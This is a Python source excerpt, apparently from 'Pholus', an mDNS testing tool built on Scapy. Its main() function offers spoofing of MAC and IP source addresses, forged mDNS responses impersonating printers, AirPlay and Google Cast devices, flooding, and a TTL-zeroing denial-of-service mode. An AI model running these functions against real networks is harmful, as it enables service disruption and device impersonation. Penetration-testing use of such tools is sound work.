    parts[0] = "%x" % (int(parts[0], 16) ^ 2)

    # format output
    ipv6Parts = []
    for i in range(0, len(parts), 2):
        ipv6Parts.append("".join(parts[i:i+2]))
    #ipv6 = "fe80::%s/64" % (":".join(ipv6Parts))
    ipv6 = "fe80::%s" % (":".join(ipv6Parts))
    return ipv6


########################################################
########################################################
def main():
    parser = argparse.ArgumentParser(description='Pholus: An mdns testing tool')
    parser.add_argument('interface',  action="store", help="the network interface to use, or the file (if -rpcap switch is used).")
    parser.add_argument('-rpcap','--readpcap', action="store_true", dest="rpcap", default=False, help="Read packets from a pcap file")
    parser.add_argument('-dns', '--DNS',  action="store_true", dest="dns", default=False, help="Use unicast DNS request; remember to define target address")
    parser.add_argument('-4', '--v4',  action="store_true", dest="v4", default=False, help="Send mdns request/response using IPv4.")
    parser.add_argument('-6', '--v6',  action="store_true", dest="v6", default=False, help="Send mdns request/response using IPv6.")
    parser.add_argument('-hl', '--hlimit',  action="store", dest="hlimit", default=255, type=int, help="The TTL (for IPv4) or Hop Limit (for IPv6).")
    parser.add_argument('-rq', '--request',  action="store_true", dest="request", default=False, help="Send mdns request.")
    parser.add_argument('-rp', '--response',  action="store_true", dest="response", default=False, help="Send unsolicired mdns response.")
    parser.add_argument('-ll', '--link_local',  action="store_true", dest="link_local", default=False, help="As IPv6 source address, use link local address instead of global address")
    parser.add_argument('-s6', '--source_addr_v6',  action="store", dest="source6", default=False, help="The IPv6 address of the sender (if you want to spoof it).")
    parser.add_argument('-s4', '--source_addr_v4',  action="store", dest="source4", default=False, help="The IPv4 address of the sender (if you want to spoof it).")
    parser.add_argument('-d6', '--dest_addr_v6', action="store", dest="d6", default="ff02::fb", help="The IPv6 destination address of the mdns packets")
    parser.add_argument('-d4', '--dest_addr_v4', action="store", dest="d4", default="224.0.0.251", help="The IPv4 destination address of the mdns packets")
    parser.add_argument('-qtype', '--gtype', action="store", dest="qtype", default="ALL", help="qtype of mDNS query (e.g. PTR, etc.)")
    parser.add_argument('-query', '--query', action="store", dest="query", default="_services._dns-sd._udp", help="Query/ies of the mDNS packet; it can be a comma-separated list")
    parser.add_argument('-qclass', '--query_class', action="store", dest="q_class", default=1, help="The class of the query (e.g. QU vs QM)")
    parser.add_argument('-qu', '--qu',  action="store_true", dest="qu", default=False, help="Send a Uniqast (QU) question in Queries")
    parser.add_argument('-dns_response', '--dns_response', action="store", dest="dns_response", default="", help="Responses of the mDNS packet; it can be a comma-separated list")
    parser.add_argument('-sttl', '--show_ttl',  action="store_true", dest="show_ttl", default=False, help="Display the DNS TTL information of the received packets.")
    parser.add_argument('-rm', '--random-mac',  action="store_true", dest="random_mac", default=False, help="Randomise the source MAC address.")
    parser.add_argument('-tm', '--target_mac',  action="store", dest="target_mac", default=False, help="The mac address of the target (optional).")
    parser.add_argument('-sm', '--source_mac',  action="store", dest="source_mac", default=False, help="The mac address of the source, e.g. for spoofing purposes (optional).")
    parser.add_argument('-stimeout','--sniffer_timeout', action="store", dest="sniffer_timeout", default=5, help="The timeout (in seconds) when the integrated sniffer (IF used) will exit automatically.")
    parser.add_argument('-domain','--domain', action="store", dest="domain", default="local", help="The domain to query; default:local")
    parser.add_argument('-rdns_scanning', '--reverse_dns_scanning',  action="store", dest="rdns_scanning", default=False, help="The IPv4 address subnet that we want to scan, e.g. 192.168.169.0/24")
    parser.add_argument('-sscan', '--service_scanning',  action="store_true", dest="service_scan", default=False, help="A service scan, initiated using _services._dns-sd._udp.local")
    parser.add_argument('-ttl','--define_ttl', action="store", dest="ttl", default=4500, help="The TTL to be used in the DNS messages.")
    parser.add_argument('-dos_ttl', '--DoS_zeroizing_ttl',  action="store_true", dest="dos_ttl", default=False, help="DoS hosts by zeroizing the TTL value of the DNS packets.")
    parser.add_argument('-conflict', '--send_conflicting_questions',  action="store_true", dest="conflict", default=False, help="Send conflicting questions with the received ones.")
    parser.add_argument('-afre', '--auto_fake_responses',  action="store_true", dest="auto_fake_responses", default=False, help="Send automatically fake resposnes")
    parser.add_argument('-printer', '--printer',  action="store_true", dest="printer", default=False, help="fake responses for printer")
    parser.add_argument('-airplay', '--airplay',  action="store_true", dest="airtv", default=False, help="fake responses for AirPlay TV")
    parser.add_argument('-workstation', '--workstation',  action="store_true", dest="workstation", default=False, help="fake responses for workstation")
    parser.add_argument('-googlecast', '--googlecast',  action="store_true", dest="googlecast", default=False, help="fake responses for googlecast")
    parser.add_argument('-fl','--flood', action="store_true", dest="flood", default=0, help="flood the targets")
    parser.add_argument('-flooding-interval','--interval-of-flooding', action="store", dest="flooding_interval", default=1, help="the interval between packets when flooding the targets")
    parser.add_argument('-ftimeout','--flooding_timeout', action="store", dest="flooding_timeout", default=200, help="The time (in seconds) to flood your target.")
    values = parser.parse_args()

    if values.rpcap:
        print("Read packets from a pcap file")
        if not os.path.isfile(values.interface):
            print('[-] ' + values.interface + ' does not exist')
            exit(0)
        elif not os.access(values.interface, os.R_OK):
            print('[-] ' + values.interface + ' access is denied')
            exit(0)
        print("Press Ctrl-C to exit and print the results")
        q = multiprocessing.Queue()
        pr = multiprocessing.Process(target=Sniffer_Offline, args=(values.interface,q,values.show_ttl,values.d4, values.d6, values.target_mac, values.auto_fake_responses,values.source6,values.source4,values.target_mac,values.target_mac,values.source_mac,values.hlimit))
        pr.start()
        pr.join()
        results=[]
        while not q.empty():
            results.append(q.get())
        myset=set(results)
        results=list(myset)
        results.sort()
        print("\n*********************************************RESULTS*********************************************")
        for r in results:
            print(r)
        exit(0)
    else:
        #####################################LETS DO SOME CHECKS FIRST TO SEE IF WE CAN WORK####################
        if os.geteuid() != 0:
            print("You must be root to run this script.")
            exit(1)
        conf.verb=0
        #########################################DEFINE SOURCE ADDRESSES########################################
        source_mac=None
        if values.random_mac:
            source_mac =  ':'.join(map(lambda x: "%02x" % x, [ 0x00, 0x16, 0x3E, random.randint(0x00, 0x7F), random.randint(0x00, 0xFF), random.randint(0x00, 0xFF) ]))
        elif values.source_mac:
            source_mac=values.source_mac
        else:
            try:
                source_mac=get_if_hwaddr(values.interface)
            except:
                print("interface ",values.interface," does not exist")
                exit(0)

        if values.qu:
            q_class=32769
        else:
            q_class=int(values.q_class)
        if not values.source6:
            source_IPv6=None
            source_IPv6=get_my_ipv6_addr(values.interface)#Selects global IPv6 address, if available
            if not source_IPv6 or values.random_mac or values.link_local: #If a random MAC is used, construct the corresponding IPv6 Link Local Address
                source_IPv6 = mac2ipv6(source_mac)
        else:
            source_IPv6=values.source6
        if not values.source4:
            source_IPv4=get_my_ipv4_addr(values.interface)
        else:
            source_IPv4=values.source4
        print("source MAC address:",source_mac,"source IPv4 Address:",source_IPv4,"source IPv6 address:",source_IPv6)
        #########################################################################################################
        if values.target_mac:
            target_mac1=values.target_mac
            target_mac2=values.target_mac
        else:
            target_mac2="33:33:00:00:00:02"
            target_mac1="01:00:5e:00:00:fb"
        ############################################Sniffing requirements########################################
        q = multiprocessing.Queue()
        if values.dos_ttl or values.auto_fake_responses:
            if values.auto_fake_responses:
                print("Send fake responses to requests" )
                if values.target_mac:
                    myfilter = "not ether src " + source_mac + " and not ether dst " + values.target_mac +" and udp and port 5353"
                else:
                    myfilter = "not ether src " + source_mac + " and udp and port 5353"
            elif values.target_mac:
                print("Performing implicit DoS by sending automated spoofed DNS Answers with TTL=0" )
                myfilter = "not ether dst " + values.target_mac + " and udp and port 5353"
            else:
                print("Performing implicit DoS by sending automated spoofed DNS Answers with TTL=0" )
                myfilter = "udp and port 5353"
            print("Sniffer filter is:",myfilter)
            print("I will sniff for",values.sniffer_timeout,"seconds, unless interrupted by Ctrl-C")
            print("Press Ctrl-C to exit")
            try:
                Sniffer(myfilter, values.interface, float(values.sniffer_timeout),q,values.dns,values.show_ttl, values.dos_ttl, values.conflict, values.ttl,values.d4, values.d6, values.target_mac, values.auto_fake_responses,source_IPv6, source_IPv4, target_mac1, target_mac2,source_mac,values.hlimit,values.workstation,values.printer,values.googlecast,values.airtv,values.flood,values.flooding_timeout,values.flooding_interval,values.v4,values.v6)
            except KeyboardInterrupt:
                print("Exiting on user's request")
                exit(0)
            exit(0)
        myfilter = "not ether src " + source_mac + " and udp and port 5353"
        print("Sniffer filter is:",myfilter)
        print("I will sniff for",values.sniffer_timeout,"seconds, unless interrupted by Ctrl-C")
        pr = multiprocessing.Process(target=Sniffer, args=(myfilter, values.interface, float(values.sniffer_timeout),q,values.dns,values.show_ttl, values.dos_ttl, values.conflict, values.ttl,values.d4,values.d6, values.target_mac, values.auto_fake_responses,source_IPv6, source_IPv4, target_mac1, target_mac2, source_mac,values.hlimit,values.workstation,values.printer,values.googlecast,values.airtv,values.flood,values.flooding_timeout,values.flooding_interval,values.v4,values.v6))
        pr.daemon = True
        pr.start()
        print("------------------------------------------------------------------------")
        time.sleep(1)#to make sure than sniffer has started before we proceed, otherwise you may miss some traffic
        ##########################################################################################################
        if values.request:
            requests(values.interface,values.v4,values.v6,source_mac,target_mac1,target_mac2,source_IPv4,source_IPv6,values.d4,values.d6,values.hlimit,values.dns,values.domain,values.query,values.qtype,True,q_class,values.flood,values.flooding_interval,values.flooding_timeout)
        elif values.response:
            #qr=1=>Response, aa=1=>Server is an authority for the domain, rd=0=> Do not query recursively
            if values.dns:
                dns_packet=UDP(dport=53)/DNS(qr=1,aa=1,rd=0)
            else:
                dns_packet=UDP(sport=5353,dport=5353)/DNS(qr=1,aa=1,rd=0)
            responses = values.dns_response.split(",")
            no_of_answers=0
            no_of_additional_records=0
            dnsar=None
            for r in responses:
                values_of_responses = r.split("/")
                dnsrr=DNSRR()
                port=0
                weight=0
                priority=0
                no_of_answers+=1
                this_is_a_dns_ar=False
                rdata=[]
                for dns_values in values_of_responses:
                    #print dns_values
                    value = dns_values.split("==")
                    if value[0]=="Type":
                        dnsrr.type=value[1]
                    elif value[0]=="Name":
                        dnsrr.rrname=value[1]
                    elif value[0]=="Target":
                        rdata.append(value[1])
                    elif value[0]=="TTL":
                        dnsrr.ttl=int(value[1])
                    elif value[0]=="Flush":
                        if value[1]=="True":
                            dnsrr.rclass=32769
                    elif value[0]=="Priority":
                        priority=int(value[1])
                    elif value[0]=="Weight":
                        weight=int(value[1])
                    elif value[0]=="Port":
                        port=int(value[1])
                    elif value[0]=="AR":
                        if value[1]=="True":
                            no_of_additional_records+=1
                            this_is_a_dns_ar=True
                if dnsrr.type==33:
                    port='{0:016b}'.format(port)
                    port="{0:0>4X}".format(int(port, 2))
                    weight='{0:016b}'.format(weight)
                    weight="{0:0>4X}".format(int(weight, 2))
                    priority='{0:016b}'.format(priority)
                    priority="{0:0>4X}".format(int(priority, 2))
                    data=priority.decode("hex")+weight.decode("hex")+port.decode("hex")
                    #http://stackoverflow.com/questions/26933016/rdata-field-of-a-dns-sd-ptr-packet-sent-via-scapy-results-in-an-unknown-extended
                    sublabels = rdata[0].split(".") + [""]
                    label_format = ""
                    for s in sublabels:
                        label_format = '%s%dp' % (label_format, len(s) + 1)
                    label_data = struct.pack(label_format, *sublabels)
                    dnsrr.rdata=data+label_data
                elif dnsrr.type==16:
                    txt_record=""
                    for r in rdata:
                        length=hex(len(r))[2:]
                        #check http://code.activestate.com/recipes/576617-converting-arbitrary-size-python-integers-to-packe/
                        if len(r) > 255:
                            s=struct.Struct('I')# CHECK IT
                        else:
                            s=struct.Struct('B')
                        value=(len(r),)
                        packed_data=s.pack(*value)
                        txt_record=txt_record+packed_data+r
                    dnsrr.rdata=txt_record
                    ##################
                    pkt=dnsrr
                    pkt.rdlen-=1
                    mylength=len(pkt.rrname)+12
                    dnsrr_packet=str(pkt)[0:mylength]+str(pkt)[mylength+1::]
                    ##################
                    dnsrr=dnsrr_packet
                else:
                    dnsrr.rdata=rdata[0]
                if not this_is_a_dns_ar:
                    dns_packet=dns_packet/dnsrr
                else:
                    if not dnsar:
                        dnsar=dnsrr
                    else:
                        dnsar=dnsar/dnsrr
            if dnsar:
                dns_packet=dns_packet/dnsar
            dns_packet[DNS].ancount=no_of_answers-no_of_additional_records
            dns_packet[DNS].arcount=no_of_additional_records
            send_packets(values.v4,values.v6,source_mac,target_mac1,target_mac2,source_IPv4,values.d4,source_IPv6,values.d6,values.interface,values.hlimit,dns_packet,values.flood,values.flooding_timeout,values.flooding_interval)
        elif values.rdns_scanning:
            dns_query=None
            ipn = ipaddress.ip_network(values.rdns_scanning)
            for ip in ipn.hosts():
                the_query = ip.reverse_pointer
                if not dns_query:
                    dns_query=DNSQR(qname=the_query,qtype=values.qtype,qclass=values.q_class)
                else:
                    dns_query=dns_query/DNSQR(qname=the_query,qtype=values.qtype,qclass=values.q_class)
            if values.dns:
                dns_packet=UDP(dport=53)/DNS(qr=0,qd=dns_query)
            else:
                dns_packet=UDP(sport=5353,dport=5353)/DNS(qr=0,qd=dns_query)
            send_packets(values.v4,values.v6,source_mac,target_mac1,target_mac2,source_IPv4,values.d4,source_IPv6,values.d6,values.interface,values.hlimit,dns_packet,values.flood,values.flooding_timeout,values.flooding_interval)
        elif values.service_scan:
            requests(values.interface,values.v4,values.v6,source_mac,target_mac1,target_mac2,source_IPv4,source_IPv6,values.d4,values.d6,values.hlimit,values.dns,values.domain,values.query,values.qtype,True,q_class,values.flood,values.flooding_interval,values.flooding_timeout)
        ############################################################################################
        ############################################################################################
        if pr:
            try:
                pr.join()
            except KeyboardInterrupt:
                print("Exiting on user's request")
                exit(0)

            #### AFTER EXITING, PRINT THE RESULTS ####
            results=[]
            while not q.empty():
                results.append(q.get())
            if values.rdns_scanning:
                targets=[]
                q2 = multiprocessing.Queue()
                pr2 = multiprocessing.Process(target=Sniffer, args=(myfilter, values.interface, float(values.sniffer_timeout),q2,values.dns,values.show_ttl, values.dos_ttl,values.conflict, values.ttl,values.d4, values.d6, values.target_mac, values.auto_fake_responses,source_IPv6, source_IPv4, target_mac1, target_mac2,source_mac,values.hlimit,values.workstation,values.printer,values.googlecast,values.airtv,values.flood,values.flooding_timeout,values.flooding_interval,values.v4,values.v6))
                pr2.daemon = True
                pr2.start()
                time.sleep(1)       #to make sure than sniffer has started before we proceed, otherwise you may miss some traffic
                for r in results:
                    r2=r.split(" ")
                    service=r2[7].strip('"')
                    if service.endswith('local.'):
                        service=service[:-6]
                    if service.endswith('.'):
                        service=service[:-1]
                    if (r2[1],service) not in targets:
                        targets.append((r2[1],service))
                        requests(values.interface,values.v4,values.v6,source_mac,target_mac1,target_mac2,source_IPv4,source_IPv6,values.d4,values.d6,values.hlimit,values.dns,values.domain,service,values.qtype,True,q_class,values.flood,values.flooding_interval,values.flooding_timeout)
                if pr2:
                    try:
                        pr2.join()
                    except KeyboardInterrupt:
                        print("Exiting on user's request")
                    while not q2.empty():
                        results.append(q2.get())
            elif values.service_scan:
                targets=[]
                q2 = multiprocessing.Queue()
                pr2 = multiprocessing.Process(target=Sniffer, args=(myfilter, values.interface, float(values.sniffer_timeout),q2,values.dns,values.show_ttl, values.dos_ttl,values.conflict, values.ttl,values.d4, values.d6, values.target_mac, values.auto_fake_responses,source_IPv6, source_IPv4, target_mac1, target_mac2,source_mac,values.hlimit,values.workstation,values.printer,values.googlecast,values.airtv,values.flood,values.flooding_timeout,values.flooding_interval,values.v4,values.v6))
                pr2.daemon = True
                pr2.start()
                time.sleep(1)       #to make sure than sniffer has started before we proceed, otherwise you may miss some traffic
                for r in results:
                    r2=r.split(" ")
                    service=r2[7].strip('"')[:-1]
                    if (r2[1],service) not in targets:
                        print((r2[1],service))
                        targets.append((r2[1],service))
                        requests(values.interface,values.v4,values.v6,source_mac,target_mac1,target_mac2,source_IPv4,source_IPv6,values.d4,values.d6,values.hlimit,values.dns,values.domain,service,values.qtype,True,q_class,values.flood,values.flooding_interval,values.flooding_timeout)
                if pr2:
                    try:
                        pr2.join()
                    except KeyboardInterrupt:
                        print("Exiting on user's request")
                    while not q2.empty():
                        results.append(q2.get())
                    targets2=[]
                    q3 = multiprocessing.Queue()
                    pr3 = multiprocessing.Process(target=Sniffer, args=(myfilter, values.interface, float(values.sniffer_timeout),q3,values.dns,values.show_ttl, values.dos_ttl, values.conflict,values.ttl,values.d4, values.d6, values.target_mac, values.auto_fake_responses,source_IPv6, source_IPv4, target_mac1, target_mac2,source_mac,values.hlimit,values.workstation,values.printer,values.googlecast,values.airtv,values.flood,values.flooding_timeout,values.flooding_interval,values.v4,values.v6))
                    pr3.daemon = True
                    pr3.start()
                    time.sleep(1)   #to make sure than sniffer has started before we proceed, otherwise you may miss some traffic
                    for r in results:
                        r2=r.split(" ")
                        service=r2[4]
                        if service.endswith('local.'):
                            service=service[:-6]
                        if service.endswith('.'):
                            service=service[:-1]
                        if (r2[1],service) not in targets and (r2[1],service) not in targets2 and "_services._dns-sd._udp" not in service:
                            targets2.append((r2[1],service))
                            requests(values.interface,values.v4,values.v6,source_mac,target_mac1,target_mac2,source_IPv4,source_IPv6,values.d4,values.d6,values.hlimit,values.dns,values.domain,service,values.qtype,True,q_class,values.flood,values.flooding_interval,values.flooding_timeout)
                if pr3:
                    try:
                        pr3.join()
                    except KeyboardInterrupt:
                        print("Exiting on user's request")
                while not q3.empty():
                    results.append(q3.get())
            print("\n*********************************************RESULTS*********************************************")
            for r in results:
                print(r)

if __name__ == '__main__':
    main()
